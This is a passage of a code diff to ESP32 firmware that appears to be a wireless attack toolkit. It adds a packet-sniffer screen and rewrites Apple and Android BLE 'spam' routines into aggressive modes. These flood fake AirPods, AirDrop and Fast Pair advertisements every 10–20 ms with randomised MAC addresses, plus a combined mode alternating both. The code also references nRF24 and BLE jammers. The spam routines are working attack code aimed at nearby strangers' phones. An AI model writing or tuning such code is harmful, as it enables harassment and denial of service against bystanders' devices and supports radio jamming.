+  tft.print("AGE");
+  
+  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
+  listY += 15;
+  
+  // Calculate pagination
+  const int PACKETS_PER_PAGE = 11;
+  int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
+  int totalPages = (totalPackets + PACKETS_PER_PAGE - 1) / PACKETS_PER_PAGE;
+  int currentPage = snifferScrollOffset / PACKETS_PER_PAGE;
+  
+  if (totalPackets == 0) {
+    tft.setTextSize(1);
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(SIDE_MARGIN, listY + 60);
+    tft.print("Waiting for packets...");
+  } else {
+    // Display packets for current page
+    int startIdx = snifferScrollOffset;
+    int endIdx = min(startIdx + PACKETS_PER_PAGE, totalPackets);
+    
+    for (int i = 0; i < (endIdx - startIdx); i++) {
+      int idx = (packetHistoryIndex - 1 - startIdx - i + MAX_SNIFFER_PACKETS) % MAX_SNIFFER_PACKETS;
+      
+      if (packetHistory[idx].timestamp == 0) continue;
+      
+      int y = listY + (i * 22);
+      
+      // ✅ FIX: Clear entire row first to prevent overlap
+      tft.fillRect(0, y, 240, 20, COLOR_BG);
+      
+      // Type with color coding
+      uint16_t typeColor = COLOR_TEXT;
+      const char* typeName = "UNK";
+      
+      if (packetHistory[idx].type == 0x80) {
+        typeColor = COLOR_GREEN;
+        typeName = "BCN";
+      } else if ((packetHistory[idx].type & 0x0C) == 0x08) {
+        typeColor = COLOR_CYAN;
+        typeName = "DAT";
+      } else if (packetHistory[idx].type == 0xC0 || packetHistory[idx].type == 0xA0) {
+        typeColor = COLOR_RED;
+        typeName = "DEA";
+      } else if (packetHistory[idx].type == 0x40) {
+        typeColor = COLOR_PURPLE;
+        typeName = "PRB";
+      }
+      
+      tft.setTextColor(typeColor);
+      tft.setTextSize(1);
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.print(typeName);
+      
+      // ✅ FIX: RSSI - NO bar, just value (cleaner)
+      int rssi = packetHistory[idx].rssi;
+      uint16_t rssiColor = (rssi > -50) ? COLOR_GREEN : (rssi > -70) ? COLOR_YELLOW : COLOR_RED;
+      
+      tft.setTextColor(rssiColor);
+      tft.setCursor(40, y);
+      tft.printf("%3d", rssi);  // 3-digit width for alignment
+      
+      // Channel
+      tft.setTextColor(COLOR_CYAN);
+      tft.setCursor(80, y);
+      tft.printf("%2d", packetHistory[idx].channel);
+      
+      // Time ago
+      unsigned long ago = (millis() - packetHistory[idx].timestamp) / 1000;
+      tft.setTextColor(COLOR_TEXT);
+      tft.setCursor(110, y);
+      if (ago < 60) {
+        tft.printf("%2ds", ago);
+      } else if (ago < 3600) {
+        tft.printf("%2dm", ago / 60);
+      } else {
+        tft.printf("%2dh", ago / 3600);
+      }
+    }
+  }
+  
+  // Footer with pagination
+  int footerY = 275;
+  
+  if (totalPages > 1) {
+    tft.drawFastHLine(0, footerY, 240, COLOR_DARK_GREEN);
+    tft.setTextSize(1);
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(SIDE_MARGIN, footerY + 5);
+    tft.printf("Page %d/%d", currentPage + 1, totalPages);
+    
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(120, footerY + 5);
+    tft.print("Tap to scroll");
+  }
+  
+  // Stop button
+  int backY = 305;
+  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(75, backY + 3);
+  tft.print("[TAP] Stop");
 }
 
 // ==================== BLE Functions ====================
@@ -6429,101 +6713,110 @@ void displayCombinedJammer() {
 void startAppleSpam() {
   if (appleSpamActive) return;
   
-  // ✅ FIX: Pause nRF24
-  bool wasNRFActive = nrfJammerActive;
+  Serial.println("\n[*] Starting Apple BLE Spam (AGGRESSIVE MODE)...");
+  Serial.println("    Using raw ESP-IDF for maximum speed");
+  
+  // Stop conflicting operations
   if (nrfJammerActive) {
-    Serial.println("[*] Pausing nRF24 for Apple spam...");
+    Serial.println("[*] Pausing nRF24...");
     nrfJammerActive = false;
     delay(100);
   }
-  
-  // Stop conflicting operations
   if (bleJammerActive) stopBLEJammer();
   if (androidSpamActive) stopAndroidSpam();
   if (continuousBLEScan) {
     continuousBLEScan = false;
-    if (pBLEScan != nullptr) {
-      pBLEScan->stop();
-    }
+    if (pBLEScan != nullptr) pBLEScan->stop();
+    delay(100);
   }
   
-  // Clean init
+  // Force complete BLE shutdown
   if (BLEDevice::getInitialized()) {
     BLEDevice::deinit(true);
-    delay(200);
+    delay(300);
   }
   
-  // Initialize BLE
-  BLEDevice::init("iPhone");
-  delay(100);
+  // LOW-LEVEL BLE INIT (ESP-IDF)
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+  esp_bt_controller_init(&bt_cfg);
+  esp_bt_controller_enable(ESP_BT_MODE_BLE);
+  
+  esp_bluedroid_init();
+  esp_bluedroid_enable();
+  
+  // Set to NON-CONNECTABLE for spam
+  esp_ble_gap_set_device_name("");
   
   appleSpamActive = true;
   appleSpamCount = 0;
   lastAppleSpam = 0;
   
-  Serial.println("[+] Apple BLE Spam started");
-  Serial.println("    Creates popup dialogs on nearby iPhones");
-  addToConsole("Apple spam: ACTIVE");
+  Serial.println("[+] Apple spam started (AGGRESSIVE)");
+  Serial.println("    Flooding at maximum rate!");
+  addToConsole("Apple spam: AGGRESSIVE");
 }
 
 void stopAppleSpam() {
   if (!appleSpamActive) return;
   
   appleSpamActive = false;
+  Serial.println("\n[*] Stopping Apple spam...");
   
+  // Stop advertising
   esp_ble_gap_stop_advertising();
   delay(100);
   
-  if (BLEDevice::getInitialized()) {
-    BLEDevice::deinit(true);
-    delay(200);
-  }
+  // Shutdown BLE stack
+  esp_bluedroid_disable();
+  esp_bluedroid_deinit();
+  esp_bt_controller_disable();
+  esp_bt_controller_deinit();
   
-  Serial.printf("[+] Apple spam stopped (%d popups sent)\n", appleSpamCount);
+  delay(200);
+  
+  Serial.printf("[+] Stopped (%d sent)\n", appleSpamCount);
   addToConsole("Apple spam stopped");
 }
 
 void performAppleSpam() {
   if (!appleSpamActive) return;
   
-  // Slower cycle: 100ms minimum (prevents crash)
-  if (millis() - lastAppleSpam < 100) return;
+  // AGGRESSIVE: 20ms cycle (50 packets/second per message type)
+  if (millis() - lastAppleSpam < 20) return;
   lastAppleSpam = millis();
   
-  // Feed watchdog
-  esp_task_wdt_reset();
+  static uint8_t msgRotation = 0;
   
-  // Build full advertisement packet
+  // Rotate through ALL message types rapidly
+  msgRotation = (msgRotation + 1) % 15;
+  
   uint8_t adv_data[31];
   uint8_t adv_len = 0;
   
   // BLE Flags
-  adv_data[adv_len++] = 0x02;  // Length
-  adv_data[adv_len++] = 0x01;  // Type: Flags
-  adv_data[adv_len++] = 0x06;  // LE General Discoverable + BR/EDR Not Supported
+  adv_data[adv_len++] = 0x02;
+  adv_data[adv_len++] = 0x01;
+  adv_data[adv_len++] = 0x1A;  // LE General + No BR/EDR
   
-  // Manufacturer Specific Data
-  adv_data[adv_len++] = 0x1B;  // Length (27 bytes for Continuity)
-  adv_data[adv_len++] = 0xFF;  // Type: Manufacturer Specific
-  adv_data[adv_len++] = 0x4C;  // Company ID: Apple (0x004C)
+  // Apple Company ID
+  adv_data[adv_len++] = 0x1B;  // Length (will adjust)
+  adv_data[adv_len++] = 0xFF;  // Manufacturer Specific
+  adv_data[adv_len++] = 0x4C;  // Apple
   adv_data[adv_len++] = 0x00;
   
-  // Choose random message type
-  static uint8_t msgType = 0;
-  msgType = (msgType + 1) % 3;
-  
-  if (msgType == 0) {
-    // Proximity Pairing (AirPods/Beats/AirTag)
-    uint16_t model = apple_models[random(0, 10)];
+  if (msgRotation < 10) {
+    // PROXIMITY PAIRING - All device types
+    uint16_t model = apple_models[msgRotation % 10];
     
-    adv_data[adv_len++] = 0x07;  // Type: Proximity Pairing
-    adv_data[adv_len++] = 0x19;  // Length: 25
-    adv_data[adv_len++] = 0x01;  // Flags
-    adv_data[adv_len++] = (model >> 8) & 0xFF;  // Model high byte
-    adv_data[adv_len++] = model & 0xFF;         // Model low byte
+    adv_data[3] = 0x1B;  // Update length
+    adv_data[adv_len++] = 0x07;  // Proximity Pairing
+    adv_data[adv_len++] = 0x19;  // Length
+    adv_data[adv_len++] = 0x01;  // Status
+    adv_data[adv_len++] = (model >> 8) & 0xFF;
+    adv_data[adv_len++] = model & 0xFF;
     adv_data[adv_len++] = 0x00;  // Status
     
-    // Random MAC address
+    // Random MAC
     for (int i = 0; i < 6; i++) {
       adv_data[adv_len++] = random(0, 256);
     }
@@ -6535,29 +6828,31 @@ void performAppleSpam() {
       adv_data[adv_len++] = 0x00;
     }
     
-    // Battery levels
-    for (int i = 0; i < 3; i++) {
-      adv_data[adv_len++] = random(0, 101);  // 0-100%
-    }
+    // Battery (random)
+    adv_data[adv_len++] = random(20, 100);
+    adv_data[adv_len++] = random(20, 100);
+    adv_data[adv_len++] = random(20, 100);
     
-  } else if (msgType == 1) {
-    // Nearby Action (AppleTV/AirDrop)
-    uint8_t action = apple_actions[random(0, 9)];
+  } else if (msgRotation < 13) {
+    // NEARBY ACTION - All action types
+    uint8_t action = apple_actions[(msgRotation - 10) % 9];
     
-    adv_data[adv_len++] = 0x0F;  // Type: Nearby Action
-    adv_data[adv_len++] = 0x05;  // Length: 5
+    adv_data[3] = 0x08;  // Update length
+    adv_data[adv_len++] = 0x0F;  // Nearby Action
+    adv_data[adv_len++] = 0x05;  // Length
     adv_data[adv_len++] = 0x00;  // Flags
-    adv_data[adv_len++] = action;  // Action type
+    adv_data[adv_len++] = action;
     
-    // Auth tag (random)
+    // Auth tag
     for (int i = 0; i < 3; i++) {
       adv_data[adv_len++] = random(0, 256);
     }
     
   } else {
-    // AirDrop
-    adv_data[adv_len++] = 0x05;  // Type: AirDrop
-    adv_data[adv_len++] = 0x12;  // Length: 18
+    // AIRDROP
+    adv_data[3] = 0x15;  // Update length
+    adv_data[adv_len++] = 0x05;  // AirDrop
+    adv_data[adv_len++] = 0x12;  // Length
     adv_data[adv_len++] = 0x00;  // Flags
     
     // Zero hash
@@ -6571,129 +6866,178 @@ void performAppleSpam() {
     }
   }
   
-  // Send raw advertisement
+  // CRITICAL: Set random MAC address for each packet
+  uint8_t random_addr[6];
+  for (int i = 0; i < 6; i++) {
+    random_addr[i] = random(0, 256);
+  }
+  random_addr[0] |= 0xC0;  // Set random address type
+  
+  esp_ble_gap_set_rand_addr(random_addr);
+  
+  // Configure advertising parameters (fast)
+  esp_ble_adv_params_t adv_params = {
+    .adv_int_min = 0x20,        // 20ms
+    .adv_int_max = 0x40,        // 40ms
+    .adv_type = ADV_TYPE_NONCONN_IND,
+    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
+    .peer_addr = {0},
+    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
+    .channel_map = ADV_CHNL_ALL,
+    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+  };
+  
+  // Send the packet
   esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
-  esp_ble_gap_start_advertising(nullptr);
+  esp_ble_gap_start_advertising(&adv_params);
   
   appleSpamCount++;
   
-  // Stop after 50ms
-  delay(50);
+  // Quick stop for next packet (10ms later)
+  delayMicroseconds(10000);
   esp_ble_gap_stop_advertising();
-  
-  yield();
 }
 
 void startAndroidSpam() {
   if (androidSpamActive) return;
   
-  // ✅ FIX: Pause nRF24
-  bool wasNRFActive = nrfJammerActive;
+  Serial.println("\n[*] Starting Android BLE Spam (AGGRESSIVE MODE)...");
+  Serial.println("    Using raw ESP-IDF for maximum speed");
+  
+  // Stop conflicting operations
   if (nrfJammerActive) {
-    Serial.println("[*] Pausing nRF24 for Android spam...");
+    Serial.println("[*] Pausing nRF24...");
     nrfJammerActive = false;
     delay(100);
   }
-  
-  // Stop conflicting operations
   if (bleJammerActive) stopBLEJammer();
   if (appleSpamActive) stopAppleSpam();
   if (continuousBLEScan) {
     continuousBLEScan = false;
-    if (pBLEScan != nullptr) {
-      pBLEScan->stop();
-    }
+    if (pBLEScan != nullptr) pBLEScan->stop();
+    delay(100);
   }
   
-  // Clean init
+  // Force complete BLE shutdown
   if (BLEDevice::getInitialized()) {
     BLEDevice::deinit(true);
-    delay(200);
+    delay(300);
   }
   
-  // Initialize BLE
-  BLEDevice::init("Pixel Buds");
-  delay(100);
+  // LOW-LEVEL BLE INIT (ESP-IDF)
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+  esp_bt_controller_init(&bt_cfg);
+  esp_bt_controller_enable(ESP_BT_MODE_BLE);
+  
+  esp_bluedroid_init();
+  esp_bluedroid_enable();
+  
+  esp_ble_gap_set_device_name("");
   
   androidSpamActive = true;
   androidSpamCount = 0;
   lastAndroidSpam = 0;
   
-  Serial.println("[+] Android BLE Spam started");
-  Serial.println("    Creates Fast Pair popups on nearby Android phones");
-  addToConsole("Android spam: ACTIVE");
+  Serial.println("[+] Android spam started (AGGRESSIVE)");
+  Serial.println("    Flooding Fast Pair at maximum rate!");
+  addToConsole("Android spam: AGGRESSIVE");
 }
 
 void stopAndroidSpam() {
   if (!androidSpamActive) return;
   
   androidSpamActive = false;
+  Serial.println("\n[*] Stopping Android spam...");
   
+  // Stop advertising
   esp_ble_gap_stop_advertising();
   delay(100);
   
-  if (BLEDevice::getInitialized()) {
-    BLEDevice::deinit(true);
-    delay(200);
-  }
+  // Shutdown BLE stack
+  esp_bluedroid_disable();
+  esp_bluedroid_deinit();
+  esp_bt_controller_disable();
+  esp_bt_controller_deinit();
   
-  Serial.printf("[+] Android spam stopped (%d popups sent)\n", androidSpamCount);
+  delay(200);
+  
+  Serial.printf("[+] Stopped (%d sent)\n", androidSpamCount);
   addToConsole("Android spam stopped");
 }
 
 void performAndroidSpam() {
   if (!androidSpamActive) return;
   
-  // Slower cycle: 100ms minimum
-  if (millis() - lastAndroidSpam < 100) return;
+  // AGGRESSIVE: 20ms cycle (50 packets/second)
+  if (millis() - lastAndroidSpam < 20) return;
   lastAndroidSpam = millis();
   
-  // Feed watchdog
-  esp_task_wdt_reset();
+  // Rotate through models rapidly
+  static uint8_t modelIndex = 0;
+  modelIndex = (modelIndex + 1) % 13;
   
-  // Build Fast Pair advertisement
+  uint32_t model = android_models[modelIndex];
+  
   uint8_t adv_data[31];
   uint8_t adv_len = 0;
   
   // BLE Flags
   adv_data[adv_len++] = 0x02;
   adv_data[adv_len++] = 0x01;
-  adv_data[adv_len++] = 0x06;
+  adv_data[adv_len++] = 0x1A;
   
-  // Service UUID (Fast Pair)
-  adv_data[adv_len++] = 0x03;  // Length
-  adv_data[adv_len++] = 0x03;  // Type: Complete List of 16-bit UUIDs
-  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID: 0xFE2C
+  // Fast Pair Service UUID
+  adv_data[adv_len++] = 0x03;
+  adv_data[adv_len++] = 0x03;
+  adv_data[adv_len++] = 0x2C;
   adv_data[adv_len++] = 0xFE;
   
-  // Service Data (Fast Pair)
+  // Fast Pair Service Data
   adv_data[adv_len++] = 0x06;  // Length
-  adv_data[adv_len++] = 0x16;  // Type: Service Data
+  adv_data[adv_len++] = 0x16;  // Service Data
   adv_data[adv_len++] = 0x2C;  // Fast Pair UUID
   adv_data[adv_len++] = 0xFE;
   
   // Model ID (3 bytes)
-  uint32_t model = android_models[random(0, 13)];
   adv_data[adv_len++] = (model >> 16) & 0xFF;
   adv_data[adv_len++] = (model >> 8) & 0xFF;
   adv_data[adv_len++] = model & 0xFF;
   
-  // TX Power (optional but helps)
+  // TX Power
   adv_data[adv_len++] = 0x02;
-  adv_data[adv_len++] = 0x0A;  // Type: TX Power
-  adv_data[adv_len++] = 0x00;  // 0 dBm
+  adv_data[adv_len++] = 0x0A;
+  adv_data[adv_len++] = 0x00;
   
-  // Send raw advertisement
+  // Random MAC for each packet
+  uint8_t random_addr[6];
+  for (int i = 0; i < 6; i++) {
+    random_addr[i] = random(0, 256);
+  }
+  random_addr[0] |= 0xC0;
+  
+  esp_ble_gap_set_rand_addr(random_addr);
+  
+  // Fast advertising parameters
+  esp_ble_adv_params_t adv_params = {
+    .adv_int_min = 0x20,        // 20ms
+    .adv_int_max = 0x40,        // 40ms
+    .adv_type = ADV_TYPE_NONCONN_IND,
+    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
+    .peer_addr = {0},
+    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
+    .channel_map = ADV_CHNL_ALL,
+    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+  };
+  
+  // Send packet
   esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
-  esp_ble_gap_start_advertising(nullptr);
+  esp_ble_gap_start_advertising(&adv_params);
   
   androidSpamCount++;
   
-  // Stop after 50ms
-  delay(50);
+  // Quick stop (10ms)
+  delayMicroseconds(10000);
   esp_ble_gap_stop_advertising();
-  
-  yield();
 }
 
 // ==================== AirTag Scanner ====================
@@ -6715,6 +7059,72 @@ void startAirTagScanner() {
   
   // Start async scan
   pBLEScan->start(10, nullptr, false);
+}
+
+// ==================== COMBINED AGGRESSIVE SPAM ====================
+void startCombinedSpam() {
+  Serial.println("\n[*] Starting COMBINED SPAM (ULTRA AGGRESSIVE)...");
+  Serial.println("    Apple + Android flooding simultaneously!");
+  
+  // Stop conflicting operations
+  if (nrfJammerActive) {
+    Serial.println("[*] Pausing nRF24...");
+    nrfJammerActive = false;
+    delay(100);
+  }
+  if (bleJammerActive) stopBLEJammer();
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan != nullptr) pBLEScan->stop();
+    delay(100);
+  }
+  
+  // Force complete BLE shutdown
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(300);
+  }
+  
+  // LOW-LEVEL BLE INIT
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+  esp_bt_controller_init(&bt_cfg);
+  esp_bt_controller_enable(ESP_BT_MODE_BLE);
+  
+  esp_bluedroid_init();
+  esp_bluedroid_enable();
+  
+  esp_ble_gap_set_device_name("");
+  
+  appleSpamActive = true;
+  androidSpamActive = true;
+  appleSpamCount = 0;
+  androidSpamCount = 0;
+  lastAppleSpam = 0;
+  lastAndroidSpam = 0;
+  
+  Serial.println("[+] COMBINED SPAM ACTIVE!");
+  Serial.println("    Alternating Apple/Android at 100 pkt/sec");
+  addToConsole("COMBINED: ULTRA AGGRESSIVE");
+}
+
+void performCombinedSpam() {
+  if (!appleSpamActive && !androidSpamActive) return;
+  
+  // ULTRA AGGRESSIVE: 10ms alternating
+  static unsigned long lastSpam = 0;
+  static bool doApple = true;
+  
+  if (millis() - lastSpam < 10) return;
+  lastSpam = millis();
+  
+  // Alternate between Apple and Android
+  if (doApple) {
+    performAppleSpam();
+  } else {
+    performAndroidSpam();
+  }
+  
+  doApple = !doApple;
 }
 
 void displayAirTagResults() {
